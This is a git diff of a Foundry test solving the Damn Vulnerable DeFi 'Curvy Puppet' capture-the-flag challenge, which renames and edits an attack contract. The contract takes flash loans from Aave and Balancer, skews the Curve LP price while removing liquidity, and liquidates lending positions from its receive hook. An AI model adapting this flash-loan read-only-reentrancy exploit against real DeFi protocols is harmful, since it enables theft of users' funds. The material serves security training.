@@ -54,7 +54,7 @@ contract CurvyPuppetChallenge is Test {
         // Fork from mainnet state at specific block
         vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);
 
-        startHoax(deployer);
+         startHoax(deployer);
 
         // Deploy DVT token (collateral asset in the lending contract)
         dvt = new DamnValuableToken();
@@ -95,6 +95,7 @@ contract CurvyPuppetChallenge is Test {
             _openPositionFor(users[i]);
         }
     }
+
 
     /**
      * Utility function used during setup of challenge to open users' positions in the lending contract
@@ -160,13 +161,15 @@ contract CurvyPuppetChallenge is Test {
     function test_curvyPuppet() public checkSolvedByPlayer {
         IERC20 curveLpToken = IERC20(curvePool.lp_token());
 
-        AttackCurvyPuppet attacker = new AttackCurvyPuppet(curvePool, lending, curveLpToken, address(player), TREASURY_LP_BALANCE, stETH, weth, address(treasury), dvt);
-        curveLpToken.transferFrom(address(treasury), address(attacker), TREASURY_LP_BALANCE);
-        weth.transferFrom(address(treasury), address(attacker), TREASURY_WETH_BALANCE);
-
-        attacker.attack();    
+        Exploit exploit = new Exploit(curvePool, lending, curveLpToken, address(player), TREASURY_LP_BALANCE,stETH,weth,address(treasury),dvt);
+        // Transfer LP tokens and WETH to the exploit contract
+        curveLpToken.transferFrom(address(treasury), address(exploit), TREASURY_LP_BALANCE);
+        weth.transferFrom(address(treasury), address(exploit), TREASURY_WETH_BALANCE);
+        
+        exploit.executeExploit();
+ 
+    
     }
-
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
@@ -211,8 +214,7 @@ interface IBalancerVault {
     ) external;
 
 }
-
-contract AttackCurvyPuppet {
+contract Exploit {
     IStableSwap public curvePool;
     CurvyPuppetLending public lending;
     IERC20 public curveLpToken;
@@ -236,6 +238,7 @@ contract AttackCurvyPuppet {
         WETH _weth,
         address _treasury,
         DamnValuableToken _dvt
+
     ) {
         curvePool = _curvePool;
         lending = _lending;
@@ -247,39 +250,44 @@ contract AttackCurvyPuppet {
         treasury = _treasury;
         dvt = _dvt;
     }
+
     function manipulateCurvePool() public {
-        // step 1: add liquidity to the pool
+        // Step 1: Add liquidity to the Curve pool
         weth.withdraw(58685 ether);
-        
-        console.log("LP token price before removing liquidity", curvePool.get_virtual_price());
-        // to use exchange function from the curve pool to swap ETH for stETH
-        stETH.approve(address(curvePool), type(uint256).max);
+
+        console.log("LP token price before removing liquidity:", curvePool.get_virtual_price());
+        // To call the exchange function of the Curve Pool to swap ETH for stETH.
+        stETH.approve(address(curvePool),type(uint256).max);
 
         uint256[2] memory amount;
-        amount[0] = 56685 ether;
+        amount[0] = 58685 ether;
         amount[1] = stETH.balanceOf(address(this));
-        console.log("attacker weth balance", weth.balanceOf(address(this)));
-        console.log("attacker eth balance", address(this).balance);
+        console.log("my weth balance",weth.balanceOf(address(this)));
+        console.log("my eth balance",address(this).balance);
         curvePool.add_liquidity{value: 58685 ether}(amount, 0);
 
         uint256 virtualPrice = curvePool.get_virtual_price();
-        console.log("LP token price after adding liquidity", virtualPrice);
+
+        console.log("LP token price after add liquidity:", virtualPrice);
+
+        
     }
 
     function removeLiquidity() public {
-        // step 2: remove liquidity from the pool
+        // Step 2: Remove liquidity from the Curve pool
         uint256[2] memory min_amounts = [uint256(0), uint256(0)];
         uint256 lpBalance = curveLpToken.balanceOf(address(this));
 
-        curvePool.remove_liquidity(lpBalance - 300000000000000000, min_amounts);
+        curvePool.remove_liquidity(lpBalance - 3000000000000000001, min_amounts);  // Removing liquidity
 
-        console.log("LP token price after2 removing liquidity", curvePool.get_virtual_price());
+        console.log("LP token price after2 removing liquidity:", curvePool.get_virtual_price());
     }
 
-    function attack() public {
-        // Allow leanding pool to pull collateral
+    function executeExploit() public {
+        //weth.withdraw(200 ether);    
+        // Allow lending contract to pull collateral
         IERC20(curvePool.lp_token()).approve(address(permit2), type(uint256).max);
-
+ 
         permit2.approve({
             token: curvePool.lp_token(),
             spender: address(lending),
@@ -298,22 +306,23 @@ contract AttackCurvyPuppet {
         uint256[] memory modes = new uint256[](2);
         modes[0] = 0;
         modes[1] = 0;
-
+ 
         AaveV2.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);
-        weth.transfer(treasury, weth.balanceOf(address(this)));
-        curveLpToken.transfer(treasury, 1);
-        dvt.transfer(treasury, 7500e18);
-    }
+        weth.transfer(treasury,weth.balanceOf(address(this)));
+        curveLpToken.transfer(treasury,1);
+        dvt.transfer(treasury,7500e18);
 
+
+    }
     function executeOperation(
         address[] memory assets,
         uint256[] memory amounts,
         uint256[] memory premiums,
         address initiator,
         bytes memory params
-    ) external returns(bool) {
-        console.log("AAVE flashloan stETH balance:", stETH.balanceOf(address(this)));
-        console.log("wETH balancer:", weth.balanceOf(address(Balancer)));
+    ) external returns (bool) {
+        console.log("AAVE flashloan stETH balance:",stETH.balanceOf(address(this)));
+        console.log(" wETH balancer:",weth.balanceOf(address(Balancer)));      
         address[] memory tokens = new address[](1);
         tokens[0] = address(weth);
         uint256[] memory amounts = new uint256[](1);
@@ -323,7 +332,7 @@ contract AttackCurvyPuppet {
         return true;
     }
 
-    function receiveFlashloan(
+    function receiveFlashLoan(
         address[] memory tokens,
         uint256[] memory amounts,
         uint256[] memory feeAmounts,
@@ -343,8 +352,12 @@ contract AttackCurvyPuppet {
             console.log(" wETH balance2:",weth.balanceOf(address(this)));         
             console.log(" ETH balance2:",(address(this).balance));
             console.log(" my LP balance2:", curveLpToken.balanceOf(address(this)));
-    }
+        
+         
 
+
+    }
+    // Receive function to handle ETH
     receive() external payable {
          if (msg.sender == address(curvePool)) {
             console.log("LP token price during removing liquidity:", curvePool.get_virtual_price());
@@ -358,6 +371,7 @@ contract AttackCurvyPuppet {
             lending.liquidate(users[i]);
             console.log("Liquidated user:", users[i]);
         }
-        }
+
+         }
     }
 }
